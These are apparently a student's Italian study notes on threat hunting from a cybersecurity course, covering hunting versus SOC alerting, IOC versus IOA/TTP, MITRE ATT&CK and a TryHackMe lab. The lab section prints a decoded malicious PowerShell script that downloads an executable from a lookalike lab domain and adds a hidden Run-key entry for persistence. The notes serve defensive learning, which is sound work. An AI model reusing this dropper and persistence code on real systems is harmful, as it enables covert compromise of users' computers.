---
date: 2026-11-20
tags:
  - CyberSecurity
subject: Defense
module: Threat Hunting
source: https://drive.osaspace.it/index.php/apps/onlyoffice/20613?filePath=%2FITS_SANDBOX%2FSANDBOX%20-%20MATERIALI%20DOCENTI%2FSECONDO%20ANNO%2FCybersecurity%2FLezione07%2FLezione07.pdf
---
# **Che cos'è?**
>- Ricerca **proattiva** di minacce che hanno eluso i controlli automatici
>- Mentalità **assume-breach**
>- Guidata da IPOTESI, non da un alert

---
## **Hunting vs SOC / alerting**

**Hunting**
>**Proattivo**, cerca ciò che che le regole non hanno visto
>Alimenta nuove detection per il SOC

**SOC / alerting**
>**Reattivo**, parte da un alert generato da una regola

![[Hunting+Soc.png]]

### **Loop dell' hunting**
>Ipotesi --> raccolta/analisi dati --> scoperta di TTP/pattern --> nuove detection

>E' un ciclo che migliora la rilevazione nel tempo

---
# **IOC / IOA TTP**

**IOC**
>Hash, IP, dominio (effimeri, cambiano facilmente)


**IOA / TTP**
>Il **comportamento** dell'attaccante (più stabile e difficile da cambiare)
>`IOA = Powershell codificato che scarica ed esegue`

---
# **MITRE ATT&CK**
>Framework che cataloga le tattiche (perchè), tecniche (come) e procedure reali degli attaccanti basato su osservazione nel mondo reale.

---
# **Laboratori TryHackMe**
[Threat Hunter](https://tryhackme.com/threat-hunting-sim/)

Leggendo il caso abbiamo notato che l'attaccante ha infettato paccheti python e NPM.
Controlliamo dal SIEM cosa ha fatto l'attaccante.
Cercando npm sul SIEM abbiamo notato 5 eventi
Il terzo include un comando encodato

>Decodificandolo in base64 notiamo:
```
dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"

# Download file
Invoke-WebRequest -Uri $url -OutFile $dest

# Base64 encode the command
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)

# Build persistence command
$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded

# Add to registry for persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd
```

>Abbiamo quindi notato che uno user si è collegato, eseguito uno script che scarica un pacchetto e lo salva come SystemHealthUpdate.exe, codifica il comando, e ne crea uno persistente da poi poter mettere nei registry di Windows all'avvio.